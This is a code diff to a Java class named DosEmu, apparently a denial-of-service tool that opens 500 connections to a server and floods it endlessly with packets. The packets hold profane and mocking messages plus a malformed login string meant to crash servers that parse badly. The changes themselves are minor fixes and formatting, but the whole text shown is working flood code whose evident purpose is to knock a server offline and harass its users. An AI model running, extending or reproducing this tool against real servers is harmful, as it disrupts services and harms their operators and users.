@@ -57,7 +57,7 @@ public class DosEmu extends Option implements Runnable
             ConnectionManager[] connections = new ConnectionManager[500];
             
             for(int i = 0; i < connections.length; i++) {
-                connection[i] = connect();
+                connections[i] = connect();
                 
                 Thread dos = new Thread(){
                     /**
@@ -70,16 +70,18 @@ public class DosEmu extends Option implements Runnable
                         packets[1] = "DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU DESU";
                         packets[2] = "What the fuck did you just said about me you little bitch? I dare you to know that I graduated top on my class of the Navy Seals and I have over 300 confirmed kills";
                         packets[3] = ">inb4 PSFucker";
-                        packets[4] = "Ohio!";
+                        packets[4] = "Ohayou!";
                         packets[5] = "Ayy lmao!";
                         packets[6] = "It seems you're being fucked :)";
                         packets[7] = "If you want this to stop just put your mobile up in the air and shout 'ACTIVATEEEEE!'";
                         packets[8] = "LELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELELEL";
                         packets[9] = ">implying";
                         packets[10] = "LOGIN|asdfasdfasdf|asdfasdf"; //If some servers can't parse packets properly a string instead of an integer might cause the server to explode :)
+
                         while(true) {
                             int pAmount = Tools.r.nextInt(2000);
                             System.out.println("Sending "+pAmount+" packets to server...");
+
                             for(int i = 0; i < pAmount; i++) {
                                 connections[i].send(packets[Tools.r.nextInt(10)]);
                                 if(!connections[i].isConnected()) {
@@ -90,10 +92,14 @@ public class DosEmu extends Option implements Runnable
                                     this.stop();
                                 }
                             }
+
                             totalPacketsSent += pAmount;
+
                             try {
                                 Thread.sleep(1000);
-                            } catch(Exception e) { }
+                            } catch(Exception e) {
+                                //Empty
+                            }
                         }
                     }
                 };
@@ -102,7 +108,9 @@ public class DosEmu extends Option implements Runnable
             System.out.println("Sleeping for 30 seconds...");
             try {
                 Thread.sleep(30000);
-            } catch(Exception e) { }
+            } catch(Exception e) {
+                //Empty
+            }
             System.out.println("Successfully sent "+totalPacketsSent+" packets!");
             System.out.println("Press 'enter' to quit");
         }
